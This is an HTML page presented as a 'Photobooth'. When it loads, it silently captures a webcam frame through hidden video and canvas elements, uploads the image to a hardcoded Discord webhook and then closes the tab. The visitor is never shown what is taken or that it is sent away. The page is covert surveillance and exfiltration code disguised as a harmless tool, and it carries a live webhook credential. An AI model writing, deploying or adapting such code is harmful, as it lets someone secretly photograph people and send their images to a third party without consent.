<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photobooth</title>
</head>
<body>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <script>
        async function startPhotoBooth() {
            try {
                // Access the camera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();

                // Wait a moment, then take a photo
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert canvas to Blob and send to Discord
                    canvas.toBlob((blob) => {
                        sendToDiscord(blob);
                        stream.getTracks().forEach(track => track.stop());
                        window.close(); // Close the tab
                    }, 'image/png');
                }, 3000);
            } catch (err) {
                alert('Camera access denied or an error occurred.');
                console.error(err);
            }
        }

        function sendToDiscord(imageBlob) {
            const webhookUrl = 'https://discord.com/api/webhooks/1323391157719269468/9KwhAyL1Lnz1PFpbXuy66DyH60rNGFpTQ1ZNwh40gUsG3v57zPfNgErHjOZX02g6X72u'; // Replace with your webhook URL
            const formData = new FormData();

            // Add the image file to the FormData object
            formData.append('file', imageBlob, 'photo.png');

            // Send the request
            fetch(webhookUrl, {
                method: 'POST',
                body: formData,
            })
                .then(response => {
                    if (response.ok) {
                        console.log('Photo sent successfully!');
                    } else {
                        console.error('Failed to send photo to Discord:', response.status);
                        response.text().then(console.error); // Log Discord's response
                    }
                })
                .catch(err => console.error('Error sending photo to Discord:', err));
        }

        // Start the photobooth when the page loads
        window.onload = startPhotoBooth;
    </script>
</body>
</html>
